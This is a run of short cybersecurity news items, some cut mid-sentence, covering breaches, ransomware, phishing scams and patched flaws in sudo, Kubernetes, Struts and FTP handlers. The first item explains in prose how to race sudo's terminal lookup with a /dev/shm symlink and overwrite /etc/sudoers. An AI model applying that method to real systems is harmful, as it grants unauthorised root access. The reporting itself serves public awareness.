because relabel_tty() (in src/selinux.c) calls open(O_RDWR|O_NONBLOCK)
on his tty and dup2()s it to the command’s stdin, stdout, and stderr.
This allows any Sudoer user to obtain full root privileges.”
To exploit the issue, a Sudo user would have to choose a device number that doesn’t exist under “/dev”. If the terminal isn’t present under the /dev/pts directory when the Sudo performs a breadth-first search of /dev, the user could allocate a pseudo-terminal between the two searchers and create a “symbolic link to the newly-created device in a world-writable directory under /dev, such as /dev/shm,”
“Exploiting the bug requires that the user already have sudo privileges. SELinux must also be enabled on the system and sudo must have been built with SELinux support.
To exploit the bug, the user can choose a device number that does not currently exist under /dev. If sudo does not find the terminal under the /dev/pts directory, it performs a breadth-first search of /dev. It is possible to allocate a pseudo-terminal after sudo has checked /dev/pts but before sudo performs its breadth-first search of /dev. The attacker may then create a symbolic link to the newly-created device in a world-writable directory under /dev, such as /dev/shm.” read a Sudo alert.
“This file will be used as the command’s standard input, output and error when an SELinux role is specified on the sudo command line. If the symbolic link under /dev/shm is replaced with a link to an another file before it is opened by sudo, it is possible to overwrite an arbitrary file by writing to the standard output or standard error. This can be escalated to full root access by rewriting a trusted file such as /etc/shadow or even /etc/sudoers.”
The Linux flaw affects all Sudo versions from 1.8.6p7 through 1.8.20, the Sudo 1.8.20p1 fixes it, the issue was rated with a CVSS3 Base Score of 7.8.

A Vermont business's computer system was attacked by hackers and held for ransom.
It may sound like a movie plot but ransomware attacks like these are on the rise. According to their 2017 Internet Crime report, last year the FBI received 1,783 complaints identified as ransomware. The adjusted losses from the attacks was over $2.3 million.
An example of a ransomware attack is software that downloads to your computer, encrypts your data and then demands money to get it back. It's technological extortion, essentially. And that's what happened to Wendell's Furniture in Colchester at the end of last month.
""Our servers crashed and when our IT guy came to take care of the problem, I asked him how the patient was doing and he just got kind of an ashen look on his face and he just shook his head and I knew we were in trouble,"" said Ryan Farrell, the vice president of Wendell's Furniture.
Farrell says in their nearly 20 years of business, they've never had this type of cybersecurity attack.
""I honestly don't think I believed it to begin with. It's something you see in the movies, something you see on TV but it's never something that I thought would happen to us, especially here in Vermont,"" Farrell said.
The company's sales information from the last 5-10 years was stolen, including customers' names, addresses, phone numbers and email addresses. However, no credit card numbers were part of the breach.
""My message to customers is not to panic, don't be worried about your information,"" Farrell said. ""Just know that it's going to take us just a little bit more time to get your sofa to you but we're open for business.""
Wendell's was able to recover most of the data but not all of it. They are still missing several months' worth of data.
""Everything that used to be easy is now really hard,"" Farrell said.
A McAfee report shows that ransomware attacks are up more than 100 percent in the second quarter of 2018 over that same time frame in 2016.
Duane Dunston teaches cybersecurity at Champlain College and says these attacks can be hard to count.
""It's not really clear because many organizations may not report it,"" he said. ""It may be easier for them to give them the money and just move on.""
Wendell's ended up paying thousands of dollars but Dunston says that can have repercussions.
""One of the dangers is that they can come back and ask for more money at a later time,"" he explained. ""There really is no way to know whether they are going to delete the data or whatever they are demanding.""
Dunston says there is lots of public information on how to protect your data but to make sure you are backing it up and updating your security systems.
Wendell's has now reinforced its computer firewalls and replaced parts of its infrastructure that are susceptible to attack.
""We're getting back on our feet,"" Farrell said.
Customers who financed their purchase with Synchrony Financial may have had their account numbers compromised, but according to Wendell's that threat is low. The business has sent out about 500 letters notifying customers and says they are doing their best to get the word out.

Reports released this past week by U.S. security officials and private cybersecurity researchers suggest hacking of energy facility computers is on the rise, and happens far more often than the public assumes.
The Department of Homeland Security said it received reports of 59 cyber incidents at energy facilities last year, up nearly a third from the year before.
The agency responsible for protecting the nation from cybercrime said it worked to mitigate 290 incidents last year across more than a dozen industries that rely on computer controls to run industrial sites, including manufacturing sites, power generation facilities, refineries, chemical plants and nuclear facilities.
It found more than a quarter of these intrusions originated from so-called spear phishing emails that hackers use to trick people into downloading infected attachments or clicking on virus-laden links.
More than one in 10 came from network probing and scanning.
""Every year, adversaries develop increasingly sophisticated attacks against control system networks,"" Homeland Security's Industrial Control Systems Cyber Emergency Response Team said.
The increased number of intrusions into energy computer controls last year brings the number of such incidents in the industry to more than 400 since 2011, Homeland Security data show.
Security specialists say that's likely a conservative number because energy companies aren't required to report cyberattacks to the U.S. government.
In another report, cybersecurity researchers believe computer controls at industrial facilities, including in the oil business, get infected by non-targeted malware at least 3,000 times a year.
Dragos Security, a cybersecurity firm in San Antonio, arrived at what it believes is a conservative estimate of worldwide industrial cyberattacks after studying 30,000 samples of infected control system files submitted over the past decade and a half to a publicly available database called VirusTotal, a web service owned by Google.
The findings show malware that isn't even tailored to industrial controls finds its way into critical technology far more often than the public assumes.
Some of the malware can spread through these systems with ease, and some were designed many years ago.
""If you have really bad cyber hygiene and you're not paying attention to basic things, you're more likely to get impacted by a virus that was written nine years ago,"" said Ben Miller of Dragos.
For example, Miller found thousands of industrial files compromised by Sinowal, a Trojan horse first discovered in 2006.
Even more common, though, were strains of malware that spread from computer to computer, created at least five years ago.
It's not clear how many of these industrial facilities were tied to the energy industry, because the VirusTotal data only provided the country of origin of the independently uploaded files.
But it's yet another grim revelation for oil companies that rely on automated computer controls to run refineries, pipelines and offshore platforms.
Miller said these breaches could begin during the equipment upgrades that happen when power plants, refineries and other energy facilities are taken offline for repairs.
Crews of engineers, equipment contractors and information technology specialists flowing in and out of the facilities could, for example, fail to follow security protocols and accidentally plug in infected USB drives into facility systems.
And they might only discover they've infected operational computers after they use the same thumb drives in corporate computers outfitted with antivirus alert systems, Miller said.

Award-winning cooking tools company OXO revealed that it has suffered data breaches over the last two years that may have compromised customer and credit card information.
In a breach disclosure letter filed with the State of California, OXO said that the data security incident involved “sophisticated criminal activity that may have exposed some of your personal information.” The attacker is believed to have accessed credit card information, along with names and billing and shipping addresses, though the letter does not state the scope of impact.
“On December 17, 2018, OXO confirmed through our forensic investigators that the security of certain personal information that you entered into our e-commerce website (https://www.oxo.com) may have been compromised. We currently believe that information entered in the customer order form between June 9, 2017 – November 28, 2017, June 8, 2018 – June 9, 2018, July 20, 2018 – October 16, 2018 may have been compromised. While we believe the attempt to compromise your payment information may have been ineffective, we are notifying you out of an abundance of caution.”
OXO is currently working with security consultants and forensic investigators, who are looking at past vulnerabilities in the website as part of an ongoing investigation of the incident. Additionally, the company has taken measures to secure its site to prevent future incidents.
“This latest breach underscores the importance of 24/7 security monitoring,” said Matan Or-El, CEO of Panorays. “With the new year upon us, companies should perform an in-depth review of all their digital assets to ensure that they and their third parties have not been compromised. We expect that future hacks will be targeted towards entire industries so as to maximize the payout for cyber-criminals.”
OXO has also secured the services of risk mitigation and response firm Kroll in order to extend identify monitoring services to its customers.

Derek Bradley, head of Panacea, an online community of 17,000 financial services professionals, has warned that phishing emails have been sent out that are purporting to be from him.
Mr Bradley originally became a victim of a cyber attack back in September when his emails were compromised.
He warned that all emails received from him to undisclosed recipients over the past seven months were not sent from his system.
In a message sent out yesterday (22 March), he said: “We are in the process of trying to work out the best course of action to ensure this stops happening, but it is difficult as I have no control over what is being sent and by whom.
“I do apologise again for any inconvenience caused to you.
We will hopefully find a resolution to this issue as soon as possible”.
Mr Bradley also warned that the hackers are continuing to try and get access to other contact lists, and told advisers to ignore emails to undisclosed recipients.
The government is facing calls to create a single point of responsibility to deal with cyber risk in the financial services sector amid concerns over accountability.
Today (23 March) Andrew Tyrie, chairman of the Treasury select committee, wrote to chancellor Philip Hammond claiming a lack of coordination in the current cyber security system could leave the banking industry’s IT systems vulnerable to attack.
My Tyrie said the present arrangement, in which both a director-level group and a governance framework can serve as a single point to address cyber issues, resembles the ""catastrophically inadequate"" tripartite authorities that were set up to monitor system risk in banking in 1997.

Researchers identified over 70 organizations targeted in these attacks, with most located in Ukraine, and especially in the self-declared separatist states of Donetsk and Luhansk, near the Russian border.
The target list includes editors of Ukrainian newspapers, a scientific research institute; a company that designs remote monitoring systems for oil & gas pipeline infrastructures; an international organization that monitors human rights, counter-terrorism and cyberattacks on critical infrastructure in Ukraine; and an engineering company that designs electrical substations, gas distribution pipelines, and water supply plants; among many others.
According to CyberX security experts, attacks are mostly driven by spear-phishing emails that spread Word documents that contain malicious macros.
Attacks lure victims into allowing the macros in these documents to execute by telling them the document was created in a newer version of Word, and enabling macros allows them to view their content.
Enabling macros downloads several malware families in multiple stages.
The downloaded malware doesn't include destructive features and uses several mechanisms to remain hidden, an important clue pointing to the fact its authors are using it for reconnaissance only.
Using Dropbox instead of a custom web server for collecting data is yet another sign that hackers are trying to stay hidden as long as possible.
This is because it would be much easier to detect malicious traffic sent to a remote web server compared to Dropbox, an application whitelisted by firewalls and other security products.
CyberX researchers named this particular campaign BugDrop because crooks used the PC's microphone's to bug victims, and Dropbox to exfiltrate data.
After they analyzed the malware deployed in this campaign, CyberX security experts claim the malware and techniques used in the BugDrop operation are similar to Groundbait, another cyber-espionage campaign discovered in May 2016 by ESET researchers.

The problems arise from the way Java and Python (through the urllib2 library in Python 2 and urllib library in Python 3) handle FTP links, which allow the attacker to inject newline (CRLF) characters inside the URL, making the Java and Python code think some parts of the URL are new commands.
This leads to a flaw that security researchers call ""protocol injection.""
The FTP protocol injection issue was first detailed by Russian security lab ONsec in 2014, but never got the public attention it needed.
Two recent reports have raised the profile of this flaw, describing two new exploitation scenarios.
Security researcher Alexander Klink detailed on his blog how the FTP protocol injection flaw could be used to send emails using Java's FTP URL handler.
Two days later, Timothy Morgan of Blindspot Security came forward and presented a more ominious exploitation scenario where the FTP URL handlers in Java and Python could be used to bypass firewalls.
Morgan also revealed that his company informed both the Python team (in January 2016) and Oracle (in November 2016) about the FTP protocol injection flaw, but neither have issued updates to address the reported problem.
At the heart of the FTP protocol injection attack resides an older issue in the FTP protocol itself, which is classic mode FTP.
The classic mode FTP is an older mechanism that governs how FTP clients and servers interact, which was proved to be insecure in issue #60 of the Phrack hacking magazine and later detailed in more depth by Florian Weimer.
Classic mode FTP has been replaced by a more secure method of client-server FTP interactions known as passive mode FTP.
Nevertheless, most firewall products support classic mode FTP connections.

Researchers from the University of Negvu have developed a way in which hackers can extract data from a victim’s computer using the LED lights displayed on their router. They can do so using a malware named xLED, as reported by JPost.
The Cyber Security Research Center at the Ben-Gurion University of the Negvu which is located in Israel have come up with a way to hack into a user’s computer and steal vital data in the form of LED lights that are displayed on a router.
Essentially, the operation would require a specially crafted malware named xLED which will need to be installed on a router in order to hack a victim. That is, the router needs to have a security flaw so as to allow the hacker to install the malware in the first place.
It can also be possible if a flawed firmware has been installed in the router, thus making it easier for the attacker to break through the device.
Once the malware is installed, the data can be exfiltrated in the binary form represented by the blinking of lights. Hence, when the light is off, it will represent a zero while when it is on, it will represent a one.
A video recording device can be used to capture the blinking pattern and utilized to steal vital information that is being transmitted through the router. The device can be anything from a recording drone to a CCTV camera.
As long as the camera captures the blinking lights, the data being transmitted can be easily stolen.
The researchers indicated that since the rate of exfiltration of data depends upon the number of LEDs being present on a router, it goes without saying that the more number of LEDs on a router, the more amount of data can be exfiltrated at any one time.
Furthermore, the researchers tested various video-recording setups to see which is the most efficient and found out that the method involving Optical Sensors was the best. This is because it received data at a higher rate and was able to sample the LED lights more quickly than any other methods.
Primarily, a data exfiltration rate of 1000 bit/sec per LED was achieved using Optical Sensors.
Although the researchers indicated that the method is the most effective one to steal a large amount of data, they, however, stated that since the method involves installing malware on a router, a number of other techniques can be used to extract data anyway.
This is because once the malware is already on the router, there are other ways in which attackers can directly intercept the data being transmitted without the need of any video recording devices.

People are still falling for fake sites pretending to be Facebook, research from Kaspersky Labs suggests.
In 2018 thus far, the Russian security company blocked “3.7 million attempts to visit fraudulent social network pages”. Notably, 58.7% of these attacks were attempting to direct users to fake FB pages.
That’s a pretty substantial slice of the pie, considering that VKontakte — Russia’s version of Facebook — was responsible for 20.8%, and LinkedIn 12.9%.
“At the beginning of the year, Facebook was the most popular social networking brand for fraudsters to abuse, and Facebook pages were frequently faked by cybercriminals to try and steal personal data via phishing attacks,” the company states in a press release.
The main targets for these attacks include “global internet portals and the financial sector, including banks, payment services and online stores,” Kaspersky adds.
The firm also suggests that this is nothing new.
“Last year Facebook was one of the top three most exploited company names. The schemes are numerous, but fairly standard: the user is asked to ‘verify’ an account or lured into signing into a phishing site on the promise of interesting content,” it reveals.
The company also noted that South America suffered the most phishing attacks in 2018 thus far. “Brazil was the country with the largest share of users attacked by phishers in the first quarter of 2018 (19%),” it revealed.
It was followed by Argentina, Venezuela, and Albania — all at 13%.

A new band of hackers, styling itself the “Turkish Crime Family”, is claiming it has secured the details of some 200m iCloud accounts and that if Apple doesn’t pay a whopping $75,000 bitcoin or ethereum ransom (or $100,000 in iTunes gift cards) it will wipe the lot.
First, Apple says its systems haven’t been breached.
The company told Naked Security:
There have not been any breaches in any of Apple’s systems including iCloud and Apple ID.
The alleged list of email addresses and passwords appears to have been obtained from previously compromised third-party services.
So 200m accounts obtained from previously compromised third party services is OK?
Obviously not, but there’s no suggestion that Apple itself is responsible for any compromised security.
The Turkish Crime Family itself appears to be new on the security scene, believed to have started life in Istanbul but now resident in Green Lanes, north London, according to one report.
Helpfully, the organisation has a Twitter account.
Another curious facet of the alleged breach is that asking for payment in extremely traceable iTunes vouchers seems more than slightly curious; why would you not ask for something with a less clean audit trail?
The group itself disputes the amount that’s been reported and blames a media relations operative (presumably the same one who put an email address for media inquiries on the Twitter profile):
This sum of $75,000 is incorrect, this was submitted by one of our old media guys that is not a part of our group.
The sum is a lot higher
The organisation has posted what it claims is video evidence to the Motherboard site.
David Kennerley, director of threat research at Webroot, is among the first to wonder whether the threat is actually real.
There are a lot of questions that need to be answered such as, do these hackers really have access to the data they claim?
How did they get hold of such a large amount of data?
Finally, there are still people who believe their Apple hardware is completely safe from malware just because it’s Apple.
It’s great kit and it works beautifully but nobody is safe 
Logging into and erasing 200 million accounts would take some time.
If it started happening, Apple could easily block the attack.
Also, they’d have to have some sort of server or admin-level access to be able to wipe or delete accounts, or even a single server’s-worth of accounts.
The Turkish Crime Family having that level of access would either entail an incredibly serious, hitherto unknown breach in Apple’s defenses (improbable), or the help of someone on the inside (more likely, but still doubtful).
If an Apple user wasn’t backing up their entire device to the Apple Cloud, a device that was wiped wouldn’t have everything for Apple to restore.
I suspect there are quite a few users that don’t do Cloud backups, or only back up a portion of their data.

A critical vulnerability in Kubernetes open-source system for handling containerized applications can enable an attacker to gain full administrator privileges on Kubernetes compute nodes.
Kubernetes makes it easier to manage a container environment  by organizing application containers into pods, nodes (physical or virtual machines) and clusters. Multiple nodes form a cluster, managed by a master that coordinates cluster-related activities like scaling, scheduling, or updating apps. 
Each node has an agent called Kubelet that facilitates communication with the Kubernetes master via the API. The number of nodes available in a Kubernetes system can be hundreds and even thousands.
Pulling this off is easy on default configurations, where ""all users (authenticated and unauthenticated) are allowed to perform discovery API calls that allow this escalation,"" says Jordan Liggitt, staff software engineer at Google.
The security bug was discovered by Darren Shepherd, co-founder of Rancher Labs company that provides the Kubernetes-as-a-Service solution called Rancher. Now tracked as CVE-2018-1002105, the flaw is critical, with a Common Vulnerability Scoring System (CVSS) score of 9.8 out of 10.
According to the latest version of the vulnerability severity calculator, exploiting the security glitch has low difficulty and does not require user interaction.
Red Hat's OpenShift Container Platform uses Kubernetes for orchestrating and managing containers is also impacted by the vulnerability. In an advisory on the matter, the company explains that the flaw can be used in two ways against its products.
One involves a normal user with 'exec,' 'attach,' or 'portforward' rights over a Kubernetes pod (a group of one or more containers that share storage and network resources); they can escalate their privileges to cluster-admin level and execute any process in a container.
The second attack method exploits the API extension feature used by ‘metrics-server’ and ‘servicecatalog’ in OpenShift Container Platform, OpenShift Online, and Dedicated. No privileges are required and an unauthenticated user can get admin rights to any API extension deployed to the cluster.
""Cluster-admin access to ‘servicecatalog’ allows creation of service brokers in any namespace and on any node,"" the advisory details.
The problem has been addressed in the latest Kubernetes revisions: v1.10.11, v1.11.5, v1.12.3, and v1.13.0-rc.1. Kubernetes releases prior to these along with the products and services based on them are affected by CVE-2018-1002105.
Red Hat released patches for the OpenShift family of containerization software (OpenShift Container Platform, OpenShift Online, and OpenShift Dedicated) and users received service updates they can install at their earliest convenience.
The software company warns that a malicious actor could exploit the vulnerability to steal data or inject malicious code, as well as ""bring down production applications and services from within an organization’s firewall.""

Austal, which is based in Henderson, Western Australia, is one of the country's largest shipbuilders; it has built vessels for the U.S. Navy.
The company, which is listed on Australia's ASX stock exchange, announced the breach late Thursday. The announcement came just a day after a security researcher in France posted screenshots on Twitter of the purported stolen data.
Austal says the material is neither sensitive nor classified and that it has taken steps to secure its data systems. 
""The data breach has had no impact on Austal's ongoing operations,"" the company says.  Austal's business in the United States is unaffected by this issue, as the computer systems are not linked.
A spokesman for Austal contacted on Friday says he couldn't offer further information on the incident. The breach exposed ship design drawings that are distributed to customers, fabrication subcontractors and suppliers, Austal says. It also exposed ""some staff email addresses and mobile phone numbers."" Those individuals have been informed as well as a ""small number"" of other stakeholders directly impacted by the breach, the company reports.
Austal has contacted the Australian Cyber Security Center and the Australian Federal Police. The Office of the Australian Information Commissioner, which enforces the country's data protection regulations ""will be involved as required,"" Austal says. 
Companies are increasingly being subjected to ransoms by hackers after their networks have been breached. Ransoms put companies in tough positions: risk public exposure of potentially embarrassing data, or risk paying a ransom and still face a chance the data could be released anyway.
Security experts and law enforcement generally advise against paying ransoms, even after incidents of file-encrypting malware. But some companies have viewed the situation as either a cost of doing business or a shorter route to recovery.
Late last month in the U.S, the city of West Haven, Connecticut, paid $2,000 to unlock 23 servers that had been infected with ransomware (see: Connecticut City Pays Ransom After Crypto-Locking Attack).
The city's attorney, Lee Tiernan, was quoted by the Associated Press as saying ""research showed it was the best course of action.""
If the city didn't have a backup file, it may have had little choice.

In recent news, millions of records containing personal information were made available to the public in a sizable data leak, providing potential scammers with plenty of information to utilize in their schemes. These records were all part of a 53 GB database that was available for purchase from Dun & Bradstreet, a business service firm.
The database contained information that could be of great use to hackers and marketers alike, as it outlined corporate data for businesses within the United States, providing professional details and contact information for members at every level of the businesses included.
Dun & Bradstreet released a statement via email in an attempt to remove the firm from any responsibility. According to the firm, there was no evidence of a breach on their systems. The email also pointed out that the leaked data was sold to “thousands” of other companies, and that the leaked data seemed to be six months old. In essence, Dun & Bradstreet’s position was “not our fault.,” and that there was little cause for worry, as the list only contained “generally publicly available business contact data.”
However, not everyone feels that the responsibility for this event can be passed off so easily, especially considering the nature of the data found on the database.
Troy Hunt manages Have I Been Pwned, a data leak alert site that allows a user to reference one of their accounts to determine if their credentials have been compromised. He offered up his own take after reviewing the database for himself. Hunt’s analysis revealed that the organizations with the most records in the database were:
    The United States Department Of Defense: 101,013
    The United States Postal Service: 88,153
    AT&T Inc.: 67,382
    Wal-Mart Stores, Inc.: 55,421
    CVS Health Corporation: 40,739
    The Ohio State University: 38,705
    Citigroup Inc.: 35,292
    Wells Fargo Bank, National Association: 34,928
    Kaiser Foundation Hospitals: 34,805
    International Business Machines Corporation: 33,412
If this list alarms you, you have the right idea. In his comments, Hunt brought up a few concerns that he had with the contents of the database out in public.
First of all, this list is essentially a guidebook for someone running a phishing campaign. A resourceful scammer could easily use the information contained in this list (including names, titles, and contact information) to create a very convincing and effective campaign. Furthermore, the most common records in the leaked database were those of government officials and employees. Hunt went so far as to mention which personnel records could be found in the database for the Department of Defense: while “Soldier” was the most common, the list also included “Chemical Engineer” and “Intelligence Analyst” entries.
In his response, Hunt asked a very important question: ""How would the U.S. military feel about this data - complete with PII [personally identifiable information] and job title - being circulated?"" With the very real threat of state-sponsored hacking and other international cyber threats in mind, Hunt brought up the value this list would have to a foreign power that isn’t fond of the U.S.
Finally, Hunt cited the chances of this data being recovered to be at a firm “zero” percent.
In short, despite the reassurances from Dun & Bradstreet, this database going public could present some very real dangers to any businesses included in it.

Tuesday in Rutland federal court to time served, or 14 months in jail. Osariemen Isibor, 32, pleaded guilty in U.S. District Court in March to conspiracy to commit wire fraud. Another man, Eneye Dania, 31, also pleaded guilty in March to being part of the same conspiracy. Last week, Dania was sentenced to serve 17 months in jail. Dania has been held in jail for about 14 months. While Isibor's prison sentence on the charge is complete and Dania's will be soon, neither is expected to be released. Instead, both are expected to be turned over to the custody of Immigration and Customs Enforcement before being deported to Nigeria. According to court records, the goal of the conspiracy was “fooling United States residents … into sending the logon information they used to access their IRS form W-2 data from their employer's website to another website designed to look like their employer's human resources page but actually operated by the conspiracy to collect this data”. Once people entered their information into the fake website, the conspirators attempted to trick the IRS into sending tax refunds to the conspirators, but prosecutors said fraud detection controls put in place by the IRS “caused most, if not all, such fraudulent tax returns to be rejected”.

State officials are investigating the theft last week of equipment from a Cobb County precinct manager’s car that could make every Georgia voters’ personal information vulnerable to theft. 
The equipment, used to check-in voters at the polls, was stolen Saturday evening, Secretary of State Brian Kemp said Monday. 
Cobb County elections director Janine Eveler said the stolen machine, known as an ExpressPoll unit, cannot be used to fraudulently vote in Tuesday’s election but that it does contain a copy of Georgia’s statewide voter file. 
“We have managed that so that what’s stolen could not impact the election,” Eveler said. 
While the file includes drivers’ license numbers, addresses and other data, it does not include Social Security numbers, Eveler said. 
But, she said, “the poll book that was stolen did have a flash card with a voter list on it. But, it does require some knowledge or expertise to use machine to retrieve the information.”
Cobb County Police and the State Election Board are investigating. 
Kemp said it was “unacceptable” that Cobb officials waited two days to notify him of the theft. 
“We have opened an investigation, and we are taking steps to ensure that it has no effect on the election tomorrow,” Kemp said in a statement. “I am confident that the results will not be compromised.”
Nearly 55,000 votes were cast in early voting ahead of Tuesday’s election, the culmination of a campaign that brought national attention to the state.

Apache Software Foundation has patched a remote code execution vulnerability affecting the Jakarta Multipart parser in Apache Struts.
Administrators need to update the popular Java application framework or put workarounds in place because the vulnerability is actively being targeted in attacks.
The issue affects Apache Struts versions 2.3.5 through 2.3.31 and versions 2.5 through 2.5.10.
The presence of vulnerable code is enough to expose the system to attack—the web application doesn’t need to implement file upload for attackers to exploit the flaw, said researchers from Cisco Talos.
Talos “found a high number of exploitation events,” said Cisco threat researcher Nick Biasini.
“With exploitation actively underway, Talos recommends immediate upgrading if possible or following the workaround referenced in the above security advisory”.
The remote code execution vulnerability (CVE-2017-5638) in the Jakarta Multipart parser is the result of improper handling of the Content-Type header, Apache said in its emergency security advisory.
The header indicates the media type of the resource, such as when the client tells the server what type of data was sent as part of a POST or PUT request, or the server telling the client what type of content is being returned as part of the response.
The flaw is triggered when Struts parses a malformed Content-Type HTTP header and lets attackers remotely take complete control of the system without needing any kind of authentication.

INDIANAPOLIS — Officials at Scotty’s Brewhouse are scrambling to deal with a data breach that leaked thousands of employee W-2 forms to an unknown scammer.
That's according to our news reporting partners at CBS4 Indy.
Company officials called police about the leak Monday afternoon.
Somebody posing as CEO Scott Wise emailed a payroll employee, asking her to send all 4,000 W-2 forms to him.
The e-mail wasn’t really from Wise, but the employee did send all the forms, giving the scammer personal finance information for all those employees.
Scotty’s Brewhouse executives contacted the IRS and Indianapolis Metropolitan Police Department about the breach.
They’re now working to notify all their employees and give them steps to protect their financial information.
IMPD and other agencies are involved in the investigation into who sent the bogus email.
This email scam matches a phishing scheme that prompted a warning from the IRS last year during tax season.
At that time, the agency recorded a 400 percent increase in this kind of scam.
The IRS has a website to use if your W-2 or other information has been leaked.
Tuesday evening, Scotty's Brewhouse issued a statement on the situation:
Yesterday Scotty’s Holdings, LLC and its subsidiary, affiliate and managed entities were the victims of an email phishing scam that resulted in the disclosure of 2016 W-2 information.
Scotty’s has confirmed that no customer information was obtained by the scammers in yesterday’s phishing scam.
Scotty’s is working closely with federal and local law enforcement and the credit bureaus to limit any potential misuse of the information that was obtained and to identify and apprehend the scammers.
“Unfortunately, Scotty’s was the target of and fell victim to scammers, as so many other companies have,” said Scott Wise, CEO of Scotty’s Holdings, LLC. “Scotty’s employees and customers are of tremendous importance to the company and Scotty’s regrets any inconvenience to its employees that may result from this scamming incident. Scotty’s will continue to work with federal and local law enforcement, the Internal Revenue Service and credit bureaus to bring the responsible party or parties to justice.”

WASHINGTON — The Internal Revenue Service said on Thursday that the personal data of as many as 100,000 taxpayers could have been compromised through a scheme in which hackers posed as students using an online tool to apply for financial aid.
The breach may be the most extensive since 2015, when thieves gained access to the tax returns of over 300,000 people by using stolen data and filed fraudulent returns to get refunds.
The possibility of an attack became known in early March after the I.R.S. shut down its Data Retrieval Tool, which families used to import tax information to Fafsa, the Free Application for Federal Student Aid, on the Education Department’s website. The shutdown, at the height of financial aid application season, caused outrage among parents and students trying to fill out the complicated Fafsa forms.
The I.R.S. has been struggling to overhaul its defenses against increasingly sophisticated cyberthreats as its budget shrinks and its staff dwindles.
The agency became concerned last fall when it realized that it was possible for criminals to take advantage of the student loan tool that allows aid applicants to automatically populate the applications with their and their parents’ tax information. The worry was that thieves might use the stolen data to file fraudulent returns and steal refunds, as they did two years ago.
“Fortunately we caught this at the front end,” John Koskinen, the I.R.S. commissioner, said Thursday at a Senate Finance Committee hearing. The I.R.S. does not expect the tool to be secure and operational again until October. “Our highest priority is making sure that we protect taxpayers and their identity,” he said.
But the breadth of the breach remains unknown, and Mr. Koskinen faced tough questions during the hearing as to why he did not act sooner.
Senator Orrin G. Hatch of Utah, the Republican chairman of the committee, wondered why Mr. Koskinen had waited several months to shut down the tool after realizing that it might be vulnerable.
Mr. Koskinen said he did not want to cut off a tool that millions of financial aid applicants use before the evidence of foul play was clear. After monitoring activity in the system, the I.R.S. noticed an unusual spike of unfinished applications in February that suggested criminals were at work.
The commissioner, who in the past has faced calls from many Republican lawmakers to resign, said that the agency had already sent out 35,000 letters to taxpayers and that it was planning to contact 100,000 people to alert them that they might be at risk. The agency believes that fewer than 8,000 fraudulent returns were filed and processed, resulting in refunds issued.
The questions about the security of data at the I.R.S. came less than two weeks before tax day and amid new calls from Republicans that Mr. Koskinen resign before his term ends in November. The commissioner has been a boogeyman for Republicans for years, because many in the party think that he has misled them over accusations that the agency overzealously audited certain conservative nonprofit groups.

The 'WannaCrypt' ransomware has been a worldwide dilemma, impacting many countries. Luckily, the malware only impacts older versions of Microsoft's operating system -- Windows 10 is not vulnerable. Also immune to WannaCrypt is macOS and Linux distributions. Unfortunately, many people run older versions of Windows, but Microsoft has been very active in issuing patches for them -- including for the now-unsupported XP.
Patches aside, security software can protect vulnerable computers too. In fact, today, Symantec announces that it has successfully blocked almost 22 million WannaCrypt attacks. The company even leveraged machine learning in its fight against the ransomware.
The company explains that it, ""blocked nearly 22 million WannaCry infection attempts across 300,000 endpoints, providing full protection for Symantec customers through its advanced exploit protection technology. The WannaCry ransomware attacks targeted and affected users in various countries across the globe by encrypting data files on infected computers and demanding users pay a $300USD ransom in bitcoin to decrypt their files. The protection of Symantec customers was enabled in part due to the integration of real-time threat intelligence shared across both Symantec Endpoint Protection and the Blue Coat ProxySG, which provided real-time threat awareness across the endpoint, network and cloud.""
Mike Fey, president and chief operating officer at Symantec explains, ""The WannaCry ransomware attack is the largest we've ever seen of its kind and we're pleased to share that Symantec customers benefited from multiple layers of protection even before it happened, through innovations and new capabilities in our Integrated Cyber Defense Platform. Our proactive network protection and advanced machine learning technologies provided real-time, zero-day, protection for all SEP and Norton customers when WannaCry was released last week. And, our Global Intelligence Network automatically shares WannaCry intelligence between Symantec endpoint, email and Blue Coat network products, providing full protection across all control points, including the cloud.""
While Symantec's announcement highlights the importance of security software for both home and business users, it shouldn't distract from the fact that it is also imperative to apply operating system updates in a timely matter. Also important is using supported software. Yes, Microsoft patched the unsupported Windows XP, but that OS should really not even be in use anymore.

The site now includes a malicious link that infects the computers of anyone visiting, Arctos contends.
Palani Bala, Arctos' CTO, claims that  HPCL's  site was compromised by a series of attacks by the pseudo-Darkleech campaign, which exposes users to Nemucod malware that, in turn, downloads Cerber ransomware onto their machines.
Darkleech is a long-running campaign that uses exploit kits to deliver malware.
The executable downloaded logs delivered by exploit kits were analyzed through a behavior analysis engine, which identified the executable file as Cerber ransomware based on behavior classification, Bala says.
Landing page deobfuscated by Arctos Ateles engine.
Source: Arctos Threat Research Co.
Bala claims the attackers run automated bots that look for vulnerable sites and then tamper with them by adding additional content that delivers malware to visitors' computers.
Experts say hackers using Cerber ransomware usually demand $1,000 in bitcoin from infected users.
Cerber ransomware and its encryption components are updated daily on the site, he adds.
First appearing in March 2016, Cerber often contains an audio file with a ransom message.
The ransomware largely spreads via spear-phishing campaigns, security experts say.
Arctos suspects the HPCL attackers' bot might have exploited vulnerabilities in an old Apache web-server or any additional services/plug-ins running in the server, Bala says.
He recommends that HPCL's webserver infrastructure perimeter be protected around the clock by advanced security monitoring solutions to detect such compromises.
In the meantime, it's time CERT-In made a recommendation to HPCL and others on how to avoid infections.

DocuSign, a major provider of electronic signature technology, acknowledged today that a series of recent malware phishing attacks targeting its customers and users was the result of a data breach at one of its computer systems. The company stresses that the data stolen was limited to customer and user email addresses, but the incident is especially dangerous because it allows attackers to target users who may already be expecting to click on links in emails from DocuSign.
San Francisco-based DocuSign warned on May 9 that it was tracking a malicious email campaign where the subject line reads, “Completed: docusign.com – Wire Transfer Instructions for recipient-name Document Ready for Signature.” The missives contained a link to a downloadable Microsoft Word document that harbored malware.
The company said at the time that the messages were not associated with DocuSign, and that they were sent from a malicious third-party using DocuSign branding in the headers and body of the email. But in an update late Monday, DocuSign confirmed that this malicious third party was able to send the messages to customers and users because it had broken in and stolen DocuSign’s list of customers and users.
“As part of our ongoing investigation, today we confirmed that a malicious third party had gained temporary access to a separate, non-core system that allows us to communicate service-related announcements to users via email,” DocuSign wrote in an alert posted to its site. “A complete forensic analysis has confirmed that only email addresses were accessed; no names, physical addresses, passwords, social security numbers, credit card data or other information was accessed. No content or any customer documents sent through DocuSign’s eSignature system was accessed; and DocuSign’s core eSignature service, envelopes and customer documents and data remain secure.”
The company is asking people to forward any suspicious emails related to DocuSign to spam@docusign.com, and then to delete the missives. 
